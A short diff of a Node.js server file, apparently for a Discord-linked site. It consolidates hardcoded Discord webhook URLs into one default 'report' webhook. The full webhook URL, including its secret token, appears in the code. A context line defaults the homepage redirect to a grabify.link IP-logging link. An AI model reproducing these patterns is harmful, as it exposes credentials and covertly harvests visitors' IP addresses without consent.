@@ -43,8 +43,9 @@ const discordWebhookCacheFile = path.join(dataDir, 'discord-webhook.json');
 const ipLogFile = path.join(dataDir, 'ip-log.txt');
 const vpnIpsFile = path.join(dataDir, 'vpn-ips.txt');
 const defaultDiscordGuildId = '1522777296547876884';
-const defaultApplicationWebhookUrl = 'https://discord.com/api/webhooks/1530688116870877385/loZbOsb5BQaUW_4wvtZ-49eBGmHK9prYzLtjOep9BAnDQbPqLngMLhf1eyVV1fC7LjtH';
-const defaultAccountDeletionWebhookUrl = 'https://discord.com/api/webhooks/1530688116870877385/loZbOsb5BQaUW_4wvtZ-49eBGmHK9prYzLtjOep9BAnDQbPqLngMLhf1eyVV1fC7LjtH';
+const defaultReportWebhookUrl = 'https://discord.com/api/webhooks/1530688116870877385/loZbOsb5BQaUW_4wvtZ-49eBGmHK9prYzLtjOep9BAnDQbPqLngMLhf1eyVV1fC7LjtH';
+const defaultApplicationWebhookUrl = defaultReportWebhookUrl;
+const defaultAccountDeletionWebhookUrl = defaultReportWebhookUrl;
 const homepageRedirectUrl = process.env.HOMEPAGE_REDIRECT_URL || 'https://grabify.link/87SEFW';
 let users = [];
 
@@ -467,7 +468,7 @@ function createApplicationId() {
 }
 
 function getDiscordConfig() {
-  const webhookUrl = (process.env.DISCORD_WEBHOOK_URL || '').trim();
+  const webhookUrl = (process.env.DISCORD_WEBHOOK_URL || defaultReportWebhookUrl).trim();
   const applicationWebhookUrl = (process.env.DISCORD_APPLICATION_WEBHOOK_URL || defaultApplicationWebhookUrl).trim();
   const accountDeletionWebhookUrl = (process.env.DISCORD_ACCOUNT_DELETION_WEBHOOK_URL || defaultAccountDeletionWebhookUrl).trim();
   const guildId = (process.env.DISCORD_GUILD_ID || defaultDiscordGuildId).trim();
